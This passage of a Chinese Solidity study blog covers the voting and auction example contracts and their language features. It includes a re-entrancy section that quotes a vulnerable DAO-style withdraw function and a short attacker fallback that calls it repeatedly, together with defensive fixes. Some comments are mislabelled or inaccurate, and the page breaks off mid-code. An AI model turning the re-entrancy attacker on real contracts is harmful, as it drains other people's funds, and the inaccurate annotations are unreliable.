<h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><h3 id="投票-代码与原版有所差异"><a href="#投票-代码与原版有所差异" class="headerlink" title="投票(代码与原版有所差异)"></a>投票(代码与原版有所差异)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Ballot &#123;</span><br><span class="line">    <span class="comment">//投票者Voter的数据结构</span></span><br><span class="line">    struct Voter &#123;</span><br><span class="line">        uint weight; <span class="comment">//该投票者的投票所占权重</span></span><br><span class="line">        bool voted;  <span class="comment">//是否投过票   </span></span><br><span class="line">        address delegate; <span class="comment">//投票对应的提案编号</span></span><br><span class="line">        uint vote;   <span class="comment">//该投票者投票权的委托对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct Proposal &#123;</span><br><span class="line">        bytes32 name;  <span class="comment">//提案名称   </span></span><br><span class="line">        uint voteCount; <span class="comment">//提案目前票数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    address <span class="keyword">public</span> chairperson;<span class="comment">//投票主持人</span></span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; Voter) <span class="keyword">public</span> voters;<span class="comment">//投票者地址与状态对应关系</span></span><br><span class="line"></span><br><span class="line">    Proposal[] <span class="keyword">public</span> proposals;<span class="comment">//提案的列表</span></span><br><span class="line">    <span class="comment">//初始化合约时，给定一个提案的列表</span></span><br><span class="line">    constructor(bytes32[] memory proposalNames) &#123;<span class="comment">//构造函数</span></span><br><span class="line">        chairperson = msg.sender;</span><br><span class="line">        voters[chairperson].weight = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; proposalNames.length; i++) &#123;</span><br><span class="line">            proposals.push(Proposal(&#123;</span><br><span class="line">                name: proposalNames[i],</span><br><span class="line">                voteCount: <span class="number">0</span></span><br><span class="line">            &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//只有投票主持者有给予Voter地址投票的权力</span></span><br><span class="line">    <span class="function">function <span class="title">giveRightToVote</span><span class="params">(address voter)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == chairperson,</span><br><span class="line">            <span class="string">&quot;Only chairperson can give right to vote.&quot;</span></span><br><span class="line">        );<span class="comment">//是否为主持人</span></span><br><span class="line">        require(</span><br><span class="line">            !voters[voter].voted,</span><br><span class="line">            <span class="string">&quot;The voter already voted.&quot;</span></span><br><span class="line">        );<span class="comment">//检测是否投票</span></span><br><span class="line">        require(voters[voter].weight == <span class="number">0</span>);<span class="comment">//投票权重是否为零</span></span><br><span class="line">        voters[voter].weight = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//投票者将自己的投票机会授权另一个地址</span></span><br><span class="line">    <span class="function">function <span class="title">delegate</span><span class="params">(address to)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        Voter storage sender = voters[msg.sender];</span><br><span class="line">        require(!sender.voted, <span class="string">&quot;You already voted.&quot;</span>);</span><br><span class="line">        require(to != msg.sender, <span class="string">&quot;Self-delegation is disallowed.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (voters[to].delegate != address(<span class="number">0</span>)) &#123;</span><br><span class="line">            to = voters[to].delegate;</span><br><span class="line"></span><br><span class="line">            require(to != msg.sender, <span class="string">&quot;Found loop in delegation.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sender.voted = <span class="keyword">true</span>;</span><br><span class="line">        sender.delegate = to;</span><br><span class="line">        Voter storage delegate_ = voters[to];</span><br><span class="line">        <span class="keyword">if</span> (delegate_.voted) &#123;</span><br><span class="line">            </span><br><span class="line">            proposals[delegate_.vote].voteCount += sender.weight;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           </span><br><span class="line">            delegate_.weight += sender.weight;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//投票者根据提案列表编号（proposal）进行投票</span></span><br><span class="line">    <span class="function">function <span class="title">vote</span><span class="params">(uint proposal)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        Voter storage sender = voters[msg.sender];<span class="comment">//修改合约中的存储状态</span></span><br><span class="line">        <span class="comment">//未加storagege修饰词，会导致sender是局部变量，调用结束会清除</span></span><br><span class="line">        require(sender.weight != <span class="number">0</span>, <span class="string">&quot;Has no right to vote&quot;</span>);</span><br><span class="line">        require(!sender.voted, <span class="string">&quot;Already voted.&quot;</span>);</span><br><span class="line">        sender.voted = <span class="keyword">true</span>;</span><br><span class="line">        sender.vote = proposal;</span><br><span class="line">        </span><br><span class="line">        proposals[proposal].voteCount += sender.weight;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//根据proposals里的票数统计（voteCount）计算出票数最多的提案编号</span></span><br><span class="line">    <span class="function">function <span class="title">winningProposal</span><span class="params">()</span> <span class="keyword">public</span> view</span></span><br><span class="line"><span class="function">            <span class="title">returns</span> <span class="params">(uint winningProposal_)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        uint winningVoteCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (uint p = <span class="number">0</span>; p &lt; proposals.length; p++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (proposals[p].voteCount &gt; winningVoteCount) &#123;</span><br><span class="line">                winningVoteCount = proposals[p].voteCount;</span><br><span class="line">                winningProposal_ = p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取票数最多的提案名称，其中调用winningProposal（）函数</span></span><br><span class="line">    <span class="function">function <span class="title">winnerName</span><span class="params">()</span> <span class="keyword">public</span> view</span></span><br><span class="line"><span class="function">            <span class="title">returns</span> <span class="params">(bytes32 winnerName_)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        winnerName_ = proposals[winningProposal()].name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="1-revert-、assert-、require-三者的区别"><a href="#1-revert-、assert-、require-三者的区别" class="headerlink" title="1.revert()、assert()、require()三者的区别"></a>1.revert()、assert()、require()三者的区别</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(msg.sender != owner) &#123; <span class="keyword">throw</span>; &#125; &lt;^<span class="number">0.4</span><span class="number">.13</span></span><br><span class="line">之后<span class="keyword">throw</span>关键字被弃用</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>assert</code> 和 <code>require</code> 可用于检查条件并在条件不满足时抛出异常。</li>
<li><code>assert</code> 函数只能用于测试内部错误，并检查非变量。 <code>require</code> 函数用于确认条件有效性，并提供一个字符串消息</li>
<li><code>revert</code> 函数可以用来标记错误并恢复当前的调用。调用包中有关错误的详细信息返回给调用者</li>
</ul>
<p><img src="/2021/03/21/13/../../code/typora/img/image-20210320220120589-7092544.png" alt="image-20210320220120589"></p>
<p> Solidity 对一个 <code>require</code> 式的异常执行回退操作（指令 <code>0xfd</code> ）并执行一个无效操作（指令 <code>0xfe</code> ）来引发 <code>assert</code> 式异常。想要保留交易原子性，最安全的做法是回退所有更改并使整个交易（或至少是调用）不产生效果</p>
<h4 id="2-memory与storage区别"><a href="#2-memory与storage区别" class="headerlink" title="2.memory与storage区别"></a>2.memory与storage区别</h4><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>storage</th>
<th>memory</th>
</tr>
</thead>
<tbody>
<tr>
<td>储存的变量</td>
<td>函数外部声明的变量，即状态变量</td>
<td>函数内部声明的变量，即局部变量</td>
</tr>
<tr>
<td>存储的位置</td>
<td>区块链上，永久存在</td>
<td>内存中，运行完之后销毁</td>
</tr>
<tr>
<td>运行的位置</td>
<td>区块链网络上</td>
<td>单个节点</td>
</tr>
<tr>
<td>传递属性</td>
<td>指针传递</td>
<td>值传递</td>
</tr>
</tbody>
</table>
</div>
<p>两者使用成本与calldata</p>
<ul>
<li><p>storage</p>
<ul>
<li><p>存储中的数据是永久存在的。存储是一个key/value库</p>
</li>
<li><p>存储中的数据写入区块链，因此会修改状态，这也是存储使用成本高的原因。</p>
</li>
<li><p>占用一个256位的槽需要消耗20000 gas</p>
</li>
<li><p>修改一个已经使用的存储槽的值，需要消耗5000 gas</p>
</li>
<li><p>当清零一个存储槽时，会返还一定数量的gas</p>
</li>
<li><p>存储按256位的槽位分配，即使没有完全使用一个槽位，也需要支付其开销</p>
</li>
</ul>
</li>
<li><p>memory</p>
<ul>
<li>内存是一个字节数组，槽大小位256位（32字节）</li>
</ul>
</li>
<li><p>数据仅在函数执行期间存在，执行完毕后就被销毁</p>
<ul>
<li>读或写一个内存槽都会消耗3gas</li>
<li>为了避免矿工的工作量过大，22个操作之后的单操作成本会上涨</li>
</ul>
</li>
<li><p>calldata/调用数据</p>
<ul>
<li>调用数据是不可修改、非持久化的区域，用来保存函数参数，其行为类似于内存</li>
<li>外部函数的参数必须使用calldata，但是也可用于其他变量</li>
<li>调用数据避免了数据拷贝，并确保数据不被修改</li>
<li>函数也可以返回使用calldata声明的数组和结果，但是不可能分配这些类型</li>
</ul>
<p>但是本合约中的多数函数需要使用storage来防止一些危险的因数，防止投票者的一些状态丢失</p>
</li>
</ul>
<h4 id="3-函数权限关键字与修饰关键字"><a href="#3-函数权限关键字与修饰关键字" class="headerlink" title="3.函数权限关键字与修饰关键字"></a>3.函数权限关键字与修饰关键字</h4><p>函数关键字</p>
<ul>
<li><strong>public</strong>：只有 public 类型的函数才可以供外部访问，当一个状态变量的权限为 public 类型时，它就会自动生成一个可供外部调用的 get 函数。当函数声明时，它默认为是 public 类型，而状态变量声明时，默认为 internal 类型。</li>
<li><strong>private</strong>：只能在当前类中进行访问，子类无法继承，也无法调用或访问。</li>
<li><strong>internal</strong>：子类继承父类，子类可以访问父类的 internal 函数，同时，使用 using for 关键字后，本类可以使用被调用类的 internal 函数。</li>
<li><strong>external</strong>：被声明的函数只能在合约外部调用。</li>
</ul>
<p>修饰关键字</p>
<ul>
<li><strong>modifier</strong>：被 modifier 关键字声明的关键字所修饰的函数只能在满足 modifier 关键字声明的关键字的要求后才会被执行。</li>
<li><strong>constant</strong>：被声明为 constant 的状态变量只能使用那些在编译时有确定值的表达式来给它们赋值。任何通过访问 内存、链数据（例如 now，this.balance 或 block.number）或执行数据（msg.gas）或对外部合约的调用来给它们赋值都是不允许的。不是所有类型的状态变量都支持用 constant 来修饰，当前支持的仅有值类型和字符串。</li>
<li><strong>view</strong>：被该关键字修饰的状态变量只能读取其值，不能对该状态变量的值进行修改。</li>
<li><strong>pure</strong>：被该关键字修饰的状态变量既不能读取变量，也不能修改该变量。</li>
</ul>
<h4 id="4-变长字节数组"><a href="#4-变长字节数组" class="headerlink" title="4.变长字节数组"></a>4.变长字节数组</h4><ul>
<li>一个元素类型为 <code>T</code>，固定长度为 <code>k</code> 的数组可以声明为 <code>T[k]</code>，而动态数组声明为 <code>T[]</code> </li>
<li>数组下标是从 0 开始的，且访问数组时的下标顺序与声明时相反 ，T[0]代表最后一个元素</li>
<li><code>.lenth</code>表示当前数组的长度。储存在storage的动态数组可以通过修改<code>.lenth</code>修改数组大小，memory的数组长度是固定的</li>
<li>变长的 存储（storage） 数组以及 <code>bytes</code> 类型（而不是 <code>string</code> 类型）都有一个叫做 <code>push</code> 的成员函数，它用来附加新的元素到数组末尾。 这个函数将返回新的数组长度</li>
</ul>
<h4 id="5-映射键值对"><a href="#5-映射键值对" class="headerlink" title="5.映射键值对"></a>5.映射键值对</h4><p><code>映射</code>或字典类型，一种键值对的映射关系存储结构。定义方式为<code>mapping(_KeyType =&gt; _KeyValue)</code>。键的类型允许除<code>映射</code>外的所有类型，如数组，合约，枚举，结构体。值的类型无限制。</p>
<p>简单来说，映射就是一个哈希表，每一个key与一个value互相对应，通过知道键值可以快速地定位到value</p>
<p>但是我们并不存储键的数据，仅仅存储它的<code>keccak256</code>哈希值，用来查找值时使用。</p>
<h4 id="6-tips"><a href="#6-tips" class="headerlink" title="6.tips"></a>6.tips</h4><p><code>solidity</code> 调用栈最深为<code>1024</code>,尽量用循环</p>
<h3 id="拍卖"><a href="#拍卖" class="headerlink" title="拍卖"></a>拍卖</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.22</span>;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    <span class="comment">// 最终受益者</span></span><br><span class="line">    address <span class="keyword">public</span> beneficiary;</span><br><span class="line">    <span class="comment">// 时间是unix的绝对时间戳（自1970-01-01以来的秒数）以秒为单位</span></span><br><span class="line">    uint <span class="keyword">public</span> auctionEnd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拍卖的当前状态</span></span><br><span class="line">    address <span class="keyword">public</span> highestBidder;<span class="comment">//最高出价者</span></span><br><span class="line">    uint <span class="keyword">public</span> highestBid;<span class="comment">//最高出价</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//可以取回的之前的出价</span></span><br><span class="line">    mapping(address =&gt; uint) pendingReturns;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拍卖结束后设为 true，将禁止所有的变更</span></span><br><span class="line">    bool ended;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 变更触发的事件</span></span><br><span class="line">    <span class="function">event <span class="title">HighestBidIncreased</span><span class="params">(address bidder, uint amount)</span></span>;</span><br><span class="line">    <span class="function">event <span class="title">AuctionEnded</span><span class="params">(address winner, uint amount)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以下是所谓的 natspec 注释，可以通过三个斜杠来识别。</span></span><br><span class="line">    <span class="comment">// 当用户被要求确认交易时将显示。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 以受益者地址 `_beneficiary` 的名义，</span></span><br><span class="line">    <span class="comment">/// 创建一个简单的拍卖，拍卖时间为 `_biddingTime` 秒。</span></span><br><span class="line">    constructor(</span><br><span class="line">        uint _biddingTime,</span><br><span class="line">        address _beneficiary</span><br><span class="line">    ) <span class="keyword">public</span> &#123;</span><br><span class="line">        beneficiary = _beneficiary;</span><br><span class="line">        auctionEnd = now + _biddingTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 对拍卖进行出价，具体的出价随交易一起发送。</span></span><br><span class="line">    <span class="comment">/// 如果没有在拍卖中胜出，则返还出价。</span></span><br><span class="line">    <span class="function">function <span class="title">bid</span><span class="params">()</span> <span class="keyword">public</span> payable </span>&#123;</span><br><span class="line">        <span class="comment">// 参数不是必要的。因为所有的信息已经包含在了交易中。</span></span><br><span class="line">        <span class="comment">// 对于能接收以太币的函数，关键字 payable 是必须的。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果拍卖已结束，撤销函数的调用。</span></span><br><span class="line">        require(</span><br><span class="line">            now &lt;= auctionEnd,</span><br><span class="line">            <span class="string">&quot;Auction already ended.&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果出价不够高，返还你的钱</span></span><br><span class="line">        require(</span><br><span class="line">            msg.value &gt; highestBid,</span><br><span class="line">            <span class="string">&quot;There already is a higher bid.&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (highestBid != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 返还出价时，简单地直接调用 highestBidder.send(highestBid) 函数，</span></span><br><span class="line">            <span class="comment">// 是有安全风险的，因为它有可能执行一个非信任合约。</span></span><br><span class="line">            <span class="comment">// 更为安全的做法是让接收方自己提取金钱。</span></span><br><span class="line">            pendingReturns[highestBidder] += highestBid;</span><br><span class="line">        &#125;</span><br><span class="line">        highestBidder = msg.sender;</span><br><span class="line">        highestBid = msg.value;</span><br><span class="line">        <span class="function">emit <span class="title">HighestBidIncreased</span><span class="params">(msg.sender, msg.value)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 取回出价（当该出价已被超越）</span></span><br><span class="line">    <span class="function">function <span class="title">withdraw</span><span class="params">()</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool)</span> </span>&#123;</span><br><span class="line">        uint amount = pendingReturns[msg.sender];</span><br><span class="line">        <span class="keyword">if</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 这里很重要，首先要设零值。</span></span><br><span class="line">            <span class="comment">// 因为，作为接收调用的一部分，</span></span><br><span class="line">            <span class="comment">// 接收者可以在 `send` 返回之前，重新调用该函数。</span></span><br><span class="line">            pendingReturns[msg.sender] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!msg.sender.send(amount)) &#123;</span><br><span class="line">                <span class="comment">// 这里不需抛出异常，只需重置未付款</span></span><br><span class="line">                pendingReturns[msg.sender] = amount;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 结束拍卖，并把最高的出价发送给受益人</span></span><br><span class="line">    <span class="function">function <span class="title">auctionEnd</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 对于可与其他合约交互的函数（意味着它会调用其他函数或发送以太币），</span></span><br><span class="line">        <span class="comment">// 一个好的指导方针是将其结构分为三个阶段：</span></span><br><span class="line">        <span class="comment">// 1. 检查条件</span></span><br><span class="line">        <span class="comment">// 2. 执行动作 (可能会改变条件)</span></span><br><span class="line">        <span class="comment">// 3. 与其他合约交互</span></span><br><span class="line">        <span class="comment">// 如果这些阶段相混合，其他的合约可能会回调当前合约并修改状态，</span></span><br><span class="line">        <span class="comment">// 或者导致某些效果（比如支付以太币）多次生效。</span></span><br><span class="line">        <span class="comment">// 如果合约内调用的函数包含了与外部合约的交互，</span></span><br><span class="line">        <span class="comment">// 则它也会被认为是与外部合约有交互的。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 条件</span></span><br><span class="line">        require(now &gt;= auctionEnd, <span class="string">&quot;Auction not yet ended.&quot;</span>);</span><br><span class="line">        require(!ended, <span class="string">&quot;auctionEnd has already been called.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 生效</span></span><br><span class="line">        ended = <span class="keyword">true</span>;</span><br><span class="line">        <span class="function">emit <span class="title">AuctionEnded</span><span class="params">(highestBidder, highestBid)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 交互</span></span><br><span class="line">        beneficiary.transfer(highestBid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="1-事件"><a href="#1-事件" class="headerlink" title="1.事件"></a>1.事件</h4><p>事件是能方便地调用以太坊虚拟机日志功能的接口。</p>
<ul>
<li>定义事件<code>event EventName(address bidder, uint amount);</code></li>
<li>触发事件<code>emit EventName(msg.sender, msg.value);</code></li>
<li>本合约使用日志功能记录不同地址的不同出价，记录后我们可以搜索事件</li>
<li>其中有一个参数修饰是 indexed ，用来表示这个参数用作索引，查询日志时就可以根据这个索引进行过滤</li>
<li><a href="https://zhuanlan.zhihu.com/p/352528276">事件搜索</a></li>
</ul>
<h4 id="2-函数返回值"><a href="#2-函数返回值" class="headerlink" title="2.函数返回值"></a>2.函数返回值</h4><ul>
<li><p>使用返回变量名</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arithmetic</span>(<span class="params">uint _a, uint _b</span>) <span class="title">public</span> <span class="title">pure</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> (<span class="params">uint o_sum, uint o_product</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        o_sum = _a + _b;</span><br><span class="line">        o_product = _a * _b;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>直接在return语句中提供返回值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arithmetic</span>(<span class="params">uint _a, uint _b</span>) <span class="title">public</span> <span class="title">pure</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> (<span class="params">uint o_sum, uint o_product</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (_a + _b, _a * _b);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Getter 函数</p>
<p>所有定义为public的状态变量都有getter函数，由编译器自动创建。该函数与变量具有相同的名称，并且具有外部可见性</p>
</li>
</ul>
<h4 id="3-payable"><a href="#3-payable" class="headerlink" title="3.payable"></a>3.payable</h4><p>如果在函数中涉及到以太币的转移，需要使用到payable关键词。意味着可以在调用这笔函数的消息中附带以太币。</p>
<h4 id="4-重入攻击-Re-Entrancy"><a href="#4-重入攻击-Re-Entrancy" class="headerlink" title="4.重入攻击-Re-Entrancy"></a>4.重入攻击-Re-Entrancy</h4><p>以太坊上的智能合约彼此之间可以相互调用。假设在一个合约A执行过程中发生了一次外部的合约B调用，并且合约B是由黑客所控制的，合约B的调用过程中可以重新进入合约A的调用。如果合约A在执行外部合约调用之前并未完成自己的内部状态更新，则有可能会被合约B利用从而盗取资产。</p>
<p>先分析DAO攻击中的问题代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withDraw</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        uint amount = userBalannce[msg.sender];</span><br><span class="line">        <span class="keyword">if</span>(amount &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            msg.sender.call.value(amount)();</span><br><span class="line">            userBalannce[msg.sender] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>该函数的功能是实现提款操作。逻辑顺序是，先执行退款操作，再将账户的余额进行相应扣除。</p>
<p>首先由于Gas的限制，不需要担心死循环。但是以太币转账会触发代码执行，如果接收方是智能合约，那么就能在接受的过程中再次调用withdraw()函数。</p>
<ul>
<li><strong>回退函数(fallback function)</strong></li>
</ul>
<p>每一个合约有且仅有一个没有名字的函数。这个函数无参数，也无返回值。如果调用合约时，没有匹配上任何一个函数(或者没有传哪怕一点数据)，就会调用默认的回退函数。此外，当合约收到<code>ether</code>时（没有任何其它数据），这个函数也会被执行。</p>
<p>如果构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;<span class="comment">//定义payable修饰使得fallback函数具备转账功能</span></span><br><span class="line">        test++;<span class="comment">//记录尝试次数</span></span><br><span class="line">        Victim(msg.sender).withDraw();<span class="comment">//调用目标合约的转账函数</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://cloud.tencent.com/developer/article/1628485">详细复现</a></p>
<p>本合约中的withdraw函数编写符合退款逻辑，避免了重入攻击</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">      uint amount = pendingReturns[msg.sender];</span><br><span class="line">      <span class="keyword">if</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          pendingReturns[msg.sender] = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (!msg.sender.send(amount)) &#123;</span><br><span class="line">              pendingReturns[msg.sender] = amount;</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>把写操作放在外部函数调用之前：先扣除在进行转账</p>
<h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><ul>
<li>变成“先记录，后转账”的模式-(Checks-effects-interactions)</li>
<li>采用<code>transfer()</code>函数进行转账，或采用<code>to.call.gas(2300).value(amount)();</code> 函数对<code>gas</code>进行限制。</li>
<li>采用锁机制</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> modifier onlyUnlocked&#123;</span><br><span class="line">        require(unlocked,<span class="string">&quot;contract is already locked&quot;</span>);</span><br><span class="line">        unlocked = <span class="keyword">false</span>;</span><br><span class="line">        _;</span><br><span class="line">        unlocked = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function">function <span class="title">withdraw</span><span class="params">()</span> onlyUnlocked</span>&#123;</span><br><span class="line">      uint256 amount = balances[msg.sender];</span><br><span class="line">      require(msg.sender.call.value(amount)());</span><br><span class="line">      balances[msg.sender] = <span class="number">0</span>;  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>modifer</p>
</li>
<li><p>```java<br>//定义修饰器</p>
<pre><code>modifier modifierfun(uint value)&#123;
    require(value &gt;= 10); 
    _;  //代表修饰器所修饰函数中的代码。
&#125;
// 修饰器修饰函数。 (先执行修饰器中的代码，再执行函数中的代码)
function setValue(uint num) modifierfun(num)&#123;
    a = num;
&#125;
</code></pre><figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 盲拍</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">pragma solidity &gt;=<span class="number">0.5</span><span class="number">.0</span> &lt;<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract BlindAuction &#123;</span><br><span class="line">    struct Bid &#123;</span><br><span class="line">        bytes32 blindedBid;</span><br><span class="line">        <span class="keyword">uint</span> deposit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    address payable <span class="keyword">public</span> beneficiary;</span><br><span class="line">    <span class="keyword">uint</span> <span class="keyword">public</span> biddingEnd;</span><br><span class="line">    <span class="keyword">uint</span> <span class="keyword">public</span> revealEnd;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">public</span> ended;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; Bid[]) <span class="keyword">public</span> bids;</span><br><span class="line"></span><br><span class="line">    address <span class="keyword">public</span> highestBidder;</span><br><span class="line">    <span class="keyword">uint</span> <span class="keyword">public</span> highestBid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以取回的之前的出价</span></span><br><span class="line">    mapping(address =&gt; <span class="keyword">uint</span>) pendingReturns;</span><br><span class="line"></span><br><span class="line">    event AuctionEnded(address winner, <span class="keyword">uint</span> highestBid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 使用 modifier 可以更便捷的校验函数的入参。</span></span><br><span class="line">    <span class="comment">/// onlyBefore 会被用于后面的 bid 函数：</span></span><br><span class="line">    <span class="comment">/// 新的函数体是由 modifier 本身的函数体，并用原函数体替换 `_;` 语句来组成的。</span></span><br><span class="line">    modifier onlyBefore(<span class="keyword">uint</span> _time) &#123; <span class="keyword">require</span>(now &lt; _time); _; &#125;</span><br><span class="line">    modifier onlyAfter(<span class="keyword">uint</span> _time) &#123; <span class="keyword">require</span>(now &gt; _time); _; &#125;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        <span class="keyword">uint</span> _biddingTime,</span><br><span class="line">        <span class="keyword">uint</span> _revealTime,</span><br><span class="line">        address payable _beneficiary</span><br><span class="line">    ) <span class="keyword">public</span> &#123;</span><br><span class="line">        beneficiary = _beneficiary;</span><br><span class="line">        biddingEnd = now + _biddingTime;</span><br><span class="line">        revealEnd = biddingEnd + _revealTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 可以通过 _blindedBid = keccak256(value, fake, secret)</span></span><br><span class="line">    <span class="comment">/// 设置一个秘密竞拍。</span></span><br><span class="line">    <span class="comment">/// 只有在出价披露阶段被正确披露，已发送的以太币才会被退还。</span></span><br><span class="line">    <span class="comment">/// 如果与出价一起发送的以太币至少为 “value” 且 “fake” 不为真，则出价有效。</span></span><br><span class="line">    <span class="comment">/// 将 “fake” 设置为 true ，然后发送满足订金金额但又不与出价相同的金额是隐藏实际出价的方法。</span></span><br><span class="line">    <span class="comment">/// 同一个地址可以放置多个出价。</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bid</span><span class="params">(bytes32 _blindedBid)</span></span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">payable</span></span></span><br><span class="line"><span class="function">        <span class="title">onlyBefore</span><span class="params">(biddingEnd)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        bids[msg.sender].push(Bid(&#123;</span><br><span class="line">            blindedBid: _blindedBid,</span><br><span class="line">            deposit: msg.value</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 披露你的秘密竞拍出价。</span></span><br><span class="line">    <span class="comment">/// 